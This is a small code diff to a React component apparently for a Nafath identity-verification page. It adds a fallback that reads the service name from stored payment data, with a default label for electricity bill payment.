@@ -34,7 +34,8 @@ export default function NafathVerify() {
     
     // جلب رقم الجوال واسم الخدمة من localStorage
     const phone = visitor.value.phone || localStorage.getItem('userPhone') || '';
-    const service = localStorage.getItem('selectedService') || new URLSearchParams(window.location.search).get('service') || '';
+    const paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+    const service = localStorage.getItem('selectedService') || new URLSearchParams(window.location.search).get('service') || paymentData.serviceName || 'دفع فاتورة الكهرباء';
     setUserPhone(phone);
     setServiceName(service);
   }, []);
